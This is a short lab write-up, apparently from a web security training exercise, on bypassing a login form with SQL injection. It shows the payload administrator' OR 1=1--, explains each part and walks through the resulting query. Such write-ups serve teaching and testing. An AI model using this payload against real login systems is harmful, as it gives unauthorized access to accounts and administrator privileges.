## Lab: SQL Injection – Login Bypass

### Goal

Determine whether the login functionality is vulnerable to SQL injection and bypass authentication without valid credentials.

---

### Observation

The application provides a login form requiring:

- username  
- password  

The backend query appears to be:

SELECT * FROM users  
WHERE username='input' AND password='input'  

This indicates that user input is directly inserted into the SQL query.

---

### Test

I entered normal credentials to observe behavior.

Then I tested for SQL injection by modifying the username input.

---

### Payload

administrator' OR 1=1--  

---

### Explanation of the Payload

- `'` → closes the original string  
- `OR` → introduces a new condition  
- `1=1` → always true  
- `--` → comments out the rest of the query  

---

### Query Execution

SELECT * FROM users  
WHERE username='administrator' OR 1=1--'  
AND password=''  

---

### Final Query Interpreted by Database

SELECT * FROM users  
WHERE username='administrator' OR 1=1  

---

### Result

Since `1=1` is always true:

- The condition always succeeds  
- Authentication is bypassed  
- Login is successful without a valid password  

---

### Impact

This vulnerability allows:

- Authentication bypass  
- Unauthorized access to accounts  
- Potential admin access  

---
